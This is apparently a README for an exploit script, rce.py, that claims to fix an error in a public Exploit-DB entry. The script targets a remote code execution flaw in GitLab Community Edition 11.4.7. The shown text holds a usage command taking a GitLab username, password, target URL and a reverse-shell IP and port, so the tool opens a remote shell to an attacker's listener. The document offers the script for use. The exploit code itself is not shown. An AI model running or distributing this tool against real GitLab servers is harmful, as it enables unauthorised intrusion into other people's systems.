# Gitlab Community Edition 11.4.7 RCE

There is a minor mistake in https://www.exploit-db.com/exploits/49334

Now, You can use this script to execute rce.

## Usage 

python3 rce.py -u Username -p Password -g http://<gitlab_url> -l <Reverse_Shell_IP> -P <Reverse_Shell_Port>

Note: check gitlab port in script if your testing environment is not hosted on default port(5080).
